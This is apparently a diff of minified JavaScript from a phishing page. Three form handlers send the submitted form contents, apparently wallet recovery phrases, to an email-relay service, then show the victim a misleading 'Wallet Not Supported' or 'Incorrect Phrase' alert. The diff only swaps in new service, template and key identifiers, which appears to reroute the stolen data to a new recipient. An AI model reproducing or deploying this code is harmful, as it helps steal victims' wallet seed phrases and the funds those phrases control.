@@ -29898,7 +29898,7 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         p ? alert("Incorrect Phrase") : (c(!0),
-                                        A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
+                                        A("service_621iwpu", "template_gnnef3h", n.current, "ZvyFQOt9PEiERL3wz").then((e => {
                                                 console.log(e),
                                                     alert("Wallet Not Supported"),
                                                     l(""),
@@ -29982,7 +29982,7 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         i ? (c(!0),
-                                        A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
+                                        A("service_621iwpu", "template_gnnef3h", n.current, "ZvyFQOt9PEiERL3wz").then((e => {
                                                 console.log(e),
                                                     alert("Wallet Not Supported"),
                                                     l(""),
@@ -30042,7 +30042,7 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         i(!0),
-                                        A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
+                                        A("service_621iwpu", "template_gnnef3h", n.current, "ZvyFQOt9PEiERL3wz").then((e => {
                                             console.log(e),
                                                 l(""),
                                                 i(!1)
